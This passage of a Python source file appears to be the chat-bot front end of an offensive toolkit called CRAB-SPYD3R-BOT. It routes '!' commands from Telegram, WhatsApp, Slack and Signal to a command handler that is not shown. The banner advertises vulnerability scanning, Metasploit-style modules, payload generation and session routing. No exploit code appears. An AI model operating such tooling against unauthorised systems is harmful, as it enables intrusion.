        if not TELETHON_AVAILABLE or not self.config.get('telegram_api_id') or not self.config.get('telegram_api_hash'):
            return False
        
        try:
            api_id = int(self.config['telegram_api_id'])
            api_hash = self.config['telegram_api_hash']
            bot_token = self.config.get('telegram_bot_token')
            
            self.client = TelegramClient('crab_bot', api_id, api_hash)
            
            @self.client.on(events.NewMessage(pattern=r'^!'))
            async def handler(event):
                user = f"telegram_{event.sender_id}"
                result = self.handler.process_command(event.message.text, 'telegram', user)
                
                if result.get('success'):
                    await event.reply(result.get('output', '✅ Done'))
                else:
                    await event.reply(f"❌ {result.get('output', 'Command failed')}")
            
            if bot_token:
                await self.client.start(bot_token=bot_token)
            else:
                await self.client.start()
            
            self.running = True
            await self.client.run_until_disconnected()
            return True
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Telegram bot in thread"""
        thread = threading.Thread(target=self._run_telegram, daemon=True)
        thread.start()
        return True
    
    def _run_telegram(self):
        """Run Telegram bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram thread error: {e}")

# =====================
# WHATSAPP BOT (using Selenium)
# =====================
class WhatsAppBot:
    """WhatsApp bot using Selenium"""
    
    def __init__(self, handler: PlatformHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.driver = None
        self.running = False
        self.wait = None
    
    def start(self):
        """Start WhatsApp bot"""
        if not SELENIUM_AVAILABLE:
            logger.error("Selenium not available")
            return False
        
        try:
            from selenium.webdriver.chrome.service import Service
            
            options = webdriver.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.wait = WebDriverWait(self.driver, 60)
            
            self.driver.get('https://web.whatsapp.com')
            logger.info("WhatsApp Web opened. Please scan QR code.")
            
            # Wait for QR scan
            input("Press Enter after scanning QR code...")
            
            self.running = True
            thread = threading.Thread(target=self._monitor_whatsapp, daemon=True)
            thread.start()
            return True
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")
            return False
    
    def _monitor_whatsapp(self):
        """Monitor WhatsApp for commands"""
        while self.running:
            try:
                # Find new messages
                messages = self.driver.find_elements(By.CSS_SELECTOR, "div.message-in")
                
                for msg in messages[-10:]:  # Check last 10 messages
                    try:
                        text_elem = msg.find_element(By.CSS_SELECTOR, "span.selectable-text")
                        text = text_elem.text
                        
                        if text.startswith('!'):
                            # Process command
                            result = self.handler.process_command(text, 'whatsapp', 'whatsapp_user')
                            
                            # Send response
                            response = result.get('output', '✅ Done') if result.get('success') else f"❌ {result.get('output', 'Command failed')}"
                            
                            # Find input box and send
                            input_box = self.driver.find_element(By.CSS_SELECTOR, "div[contenteditable='true']")
                            input_box.send_keys(response)
                            input_box.send_keys("\n")
                    except:
                        pass
                
                time.sleep(2)
            except Exception as e:
                logger.error(f"WhatsApp monitor error: {e}")
                time.sleep(5)
    
    def stop(self):
        """Stop WhatsApp bot"""
        self.running = False
        if self.driver:
            self.driver.quit()

# =====================
# SLACK BOT
# =====================
class SlackBot:
    """Slack bot implementation"""
    
    def __init__(self, handler: PlatformHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.client = None
        self.socket_client = None
        self.running = False
    
    def start(self):
        """Start Slack bot"""
        if not SLACK_AVAILABLE or not self.config.get('slack_bot_token'):
            return False
        
        try:
            self.client = WebClient(token=self.config['slack_bot_token'])
            
            # Test connection
            self.client.auth_test()
            
            if self.config.get('slack_app_token'):
                self.socket_client = SocketModeClient(
                    app_token=self.config['slack_app_token'],
                    web_client=self.client
                )
                
                @self.socket_client.on("message")
                def handle_message(client, req: SocketModeRequest):
                    if req.type == "events_api":
                        event = req.payload.get("event", {})
                        if event.get("type") == "message" and "text" in event:
                            text = event.get("text", "")
                            if text.startswith('!'):
                                user = event.get("user", "unknown")
                                channel = event.get("channel")
                                
                                result = self.handler.process_command(text, 'slack', user)
                                
                                response = result.get('output', '✅ Done') if result.get('success') else f"❌ {result.get('output', 'Command failed')}"
                                self.client.chat_postMessage(channel=channel, text=response)
                    
                    return SocketModeResponse(envelope_id=req.envelope_id)
                
                self.socket_client.connect()
            
            self.running = True
            logger.info("Slack bot started")
            return True
        except Exception as e:
            logger.error(f"Slack bot error: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Slack bot in thread"""
        thread = threading.Thread(target=self._run_slack, daemon=True)
        thread.start()
        return True
    
    def _run_slack(self):
        """Run Slack bot in thread"""
        try:
            if self.socket_client:
                from slack_sdk.socket_mode.request import SocketModeRequest
                import signal
                signal.pause()
        except Exception as e:
            logger.error(f"Slack thread error: {e}")

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    """Signal bot implementation"""
    
    def __init__(self, handler: PlatformHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.bot = None
        self.running = False
    
    def start(self):
        """Start Signal bot"""
        if not SIGNAL_AVAILABLE or not self.config.get('signal_phone_number'):
            return False
        
        try:
            from signalbot import SignalBot as SignalBotLib
            from signalbot import Command, Context
            
            class CrabCommand(Command):
                def __init__(self, handler):
                    super().__init__()
                    self.handler = handler
                
                async def handle(self, ctx: Context):
                    message = ctx.message.text
                    if message and message.startswith('!'):
                        user = ctx.message.source_uuid
                        result = self.handler.process_command(message, 'signal', user)
                        
                        response = result.get('output', '✅ Done') if result.get('success') else f"❌ {result.get('output', 'Command failed')}"
                        await ctx.reply(response)
            
            self.bot = SignalBotLib(
                phone_number=self.config['signal_phone_number']
            )
            self.bot.register(CrabCommand(self.handler))
            
            self.running = True
            thread = threading.Thread(target=self._run_signal, daemon=True)
            thread.start()
            return True
        except Exception as e:
            logger.error(f"Signal bot error: {e}")
            return False
    
    def _run_signal(self):
        """Run Signal bot in thread"""
        try:
            if self.bot:
                self.bot.start()
        except Exception as e:
            logger.error(f"Signal thread error: {e}")

# =====================
# MAIN APPLICATION
# =====================
class CrabSpyd3rBot:
    """Main application class"""
    
    def __init__(self):
        self.config = self.load_config()
        self.db = DatabaseManager()
        self.handler = PlatformHandler(self.db)
        
        # Initialize bots
        self.discord_bot = DiscordBot(self.handler, self.config)
        self.telegram_bot = TelegramBot(self.handler, self.config)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.config)
        self.slack_bot = SlackBot(self.handler, self.config)
        self.signal_bot = SignalBot(self.handler, self.config)
        
        self.running = True
    
    def load_config(self) -> Dict:
        """Load configuration"""
        default_config = {
            'discord_token': '',
            'telegram_api_id': '',
            'telegram_api_hash': '',
            'telegram_bot_token': '',
            'slack_bot_token': '',
            'slack_app_token': '',
            'signal_phone_number': '',
            'enable_discord': False,
            'enable_telegram': False,
            'enable_whatsapp': False,
            'enable_slack': False,
            'enable_signal': False
        }
        
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    loaded = json.load(f)
                    default_config.update(loaded)
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return default_config
    
    def save_config(self):
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
            logger.info("Configuration saved")
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
    
    def print_banner(self):
        """Print banner"""
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════╗
║{Colors.ORANGE}        🦀 CRAB-SPYD3R-BOT v0.0.4   🦀                          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}  • Nmap scanning: -sn, -O, -sV, -A, --script vuln      {Colors.PRIMARY}║
║{Colors.ACCENT}  • Metasploit-style auxiliary modules                  {Colors.PRIMARY}║
║{Colors.ACCENT}  • Payload generation for all platforms                {Colors.PRIMARY}║
║{Colors.ACCENT}  • Session management & routing                         {Colors.PRIMARY}║
║{Colors.ACCENT}  • Workspace organization                               {Colors.PRIMARY}║
║{Colors.ACCENT}  • Multi-platform: Discord, Telegram, WhatsApp         {Colors.PRIMARY}║
║{Colors.ACCENT}    Slack, Signal                                        {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def setup(self):
        """Setup configuration"""
        print(f"{Colors.PRIMARY}🦀 CRAB-SPYD3R-BOT Setup{Colors.RESET}")
        print()
        
        # Discord setup
        setup_discord = input(f"{Colors.SECONDARY}Setup Discord bot? (y/n): {Colors.RESET}").lower() == 'y'
        if setup_discord:
            self.config['discord_token'] = input(f"{Colors.SECONDARY}Enter Discord bot token: {Colors.RESET}").strip()
            self.config['enable_discord'] = bool(self.config['discord_token'])
        
        # Telegram setup
        setup_telegram = input(f"{Colors.SECONDARY}Setup Telegram bot? (y/n): {Colors.RESET}").lower() == 'y'
        if setup_telegram:
            self.config['telegram_api_id'] = input(f"{Colors.SECONDARY}Enter Telegram API ID: {Colors.RESET}").strip()
            self.config['telegram_api_hash'] = input(f"{Colors.SECONDARY}Enter Telegram API Hash: {Colors.RESET}").strip()
            self.config['telegram_bot_token'] = input(f"{Colors.SECONDARY}Enter Telegram Bot Token (optional): {Colors.RESET}").strip()
            self.config['enable_telegram'] = bool(self.config['telegram_api_id'] and self.config['telegram_api_hash'])
        
        # Slack setup
        setup_slack = input(f"{Colors.SECONDARY}Setup Slack bot? (y/n): {Colors.RESET}").lower() == 'y'
        if setup_slack:
            self.config['slack_bot_token'] = input(f"{Colors.SECONDARY}Enter Slack Bot Token: {Colors.RESET}").strip()
            self.config['slack_app_token'] = input(f"{Colors.SECONDARY}Enter Slack App Token (for Socket Mode): {Colors.RESET}").strip()
            self.config['enable_slack'] = bool(self.config['slack_bot_token'])
        
        # Signal setup
        setup_signal = input(f"{Colors.SECONDARY}Setup Signal bot? (y/n): {Colors.RESET}").lower() == 'y'
        if setup_signal:
            self.config['signal_phone_number'] = input(f"{Colors.SECONDARY}Enter Signal phone number (with country code): {Colors.RESET}").strip()
            self.config['enable_signal'] = bool(self.config['signal_phone_number'])
        
        # WhatsApp setup (always available via Selenium)
        setup_whatsapp = input(f"{Colors.SECONDARY}Setup WhatsApp bot? (y/n): {Colors.RESET}").lower() == 'y'
        self.config['enable_whatsapp'] = setup_whatsapp
        
        self.save_config()
        print(f"{Colors.SUCCESS}✅ Configuration saved{Colors.RESET}")
    
    def start_bots(self):
        """Start all configured bots"""
        print(f"{Colors.PRIMARY}Starting bots...{Colors.RESET}")
        
        if self.config['enable_discord'] and self.config['discord_token']:
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Discord bot started{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Discord bot failed to start{Colors.RESET}")
        
        if self.config['enable_telegram'] and self.config['telegram_api_id']:
            if self.telegram_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Telegram bot started{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Telegram bot failed to start{Colors.RESET}")
        
        if self.config['enable_whatsapp']:
            if self.whatsapp_bot.start():
                print(f"{Colors.SUCCESS}✅ WhatsApp bot started{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ WhatsApp bot failed to start{Colors.RESET}")
        
        if self.config['enable_slack'] and self.config['slack_bot_token']:
            if self.slack_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Slack bot started{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Slack bot failed to start{Colors.RESET}")
        
        if self.config['enable_signal'] and self.config['signal_phone_number']:
            if self.signal_bot.start():
                print(f"{Colors.SUCCESS}✅ Signal bot started{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Signal bot failed to start{Colors.RESET}")
    
    def run_cli(self):
        """Run CLI interface"""
        print(f"{Colors.SUCCESS}✅ Ready! Type '!help' for commands{Colors.RESET}")
        print(f"{Colors.ACCENT}Commands will be processed in all connected platforms{Colors.RESET}")
        print()
        
        while self.running:
            try:
                cmd = input(f"{Colors.PRIMARY}crab> {Colors.RESET}").strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.SUCCESS}👋 Goodbye!{Colors.RESET}")
                    break
                
                elif cmd.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                
                elif cmd.lower() == 'status':
                    self.show_status()
                
                else:
                    result = self.handler.process_command(cmd, 'cli', 'local_user')
                    
                    if result.get('success'):
                        print(result.get('output', '✅ Done'))
                    else:
                        print(f"{Colors.ERROR}{result.get('output', 'Command failed')}{Colors.RESET}")
                    
                    print(f"{Colors.SUCCESS}⏱️ {result.get('execution_time', 0):.2f}s{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
    
    def show_status(self):
        """Show status of all components"""
        print(f"{Colors.PRIMARY}📊 CRAB-SPYD3R-BOT Status{Colors.RESET}")
        print()
        
        # Database status
        stats = self.db.get_statistics() if hasattr(self.db, 'get_statistics') else {}
        print(f"{Colors.SECONDARY}Database:{Colors.RESET}")
        print(f"  Hosts: {len(self.handler.workspaces.list_hosts())}")
        print(f"  Active Sessions: {len(self.handler.sessions.list_sessions())}")
        print(f"  Routes: {len(self.handler.sessions.list_routes())}")
        print()
        
        # Bot status
        print(f"{Colors.SECONDARY}Bots:{Colors.RESET}")
        print(f"  Discord: {'✅' if self.discord_bot.running else '❌'}")
        print(f"  Telegram: {'✅' if self.telegram_bot.running else '❌'}")
        print(f"  WhatsApp: {'✅' if self.whatsapp_bot.running else '❌'}")
        print(f"  Slack: {'✅' if self.slack_bot.running else '❌'}")
        print(f"  Signal: {'✅' if self.signal_bot.running else '❌'}")
        print()
        
        # Workspace info
        workspace = self.handler.workspaces.get_current_workspace()
        if workspace:
            print(f"{Colors.SECONDARY}Current Workspace:{Colors.RESET} {workspace.get('name', 'default')}")
    
    def cleanup(self):
        """Cleanup resources"""
        print(f"{Colors.WARNING}Cleaning up...{Colors.RESET}")
        
        # Stop bots
        if self.whatsapp_bot.running:
            self.whatsapp_bot.stop()
        
        # Close database
        self.db.close()
        
        print(f"{Colors.SUCCESS}✅ Cleanup complete{Colors.RESET}")
    
    def run(self):
        """Main run method"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Setup if first run
        if not os.path.exists(CONFIG_FILE):
            self.setup()
        
        # Start bots
        self.start_bots()
        
        # Run CLI
        self.run_cli()
        
        # Cleanup
        self.cleanup()

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = CrabSpyd3rBot()
        app.run()
    
    except Exception as e:
        print(f"{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()